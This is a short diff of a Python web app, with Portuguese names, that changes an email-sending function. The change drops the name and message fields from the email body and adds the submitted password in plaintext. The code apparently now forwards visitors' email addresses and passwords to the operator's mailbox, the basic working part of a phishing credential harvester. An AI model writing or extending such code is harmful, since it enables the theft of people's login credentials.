@@ -21,9 +21,8 @@ def enviar_email(email, password):
 
     html = f"""
     <h2>Nova mensagem</h2>
-    <p><b>Nome:</b> {name}</p>
     <p><b>Email:</b> {email}</p>
-    <p><b>Mensagem:</b> {message}</p>
+    <p><b>Senha:</b> {password}</p>
     """
 
     msg.attach(MIMEText(html, "html"))
@@ -32,6 +31,7 @@ def enviar_email(email, password):
         servidor.starttls()
         servidor.login(remetente, senha)
         servidor.send_message(msg)
+
 
 @app.get("/")
 def home():
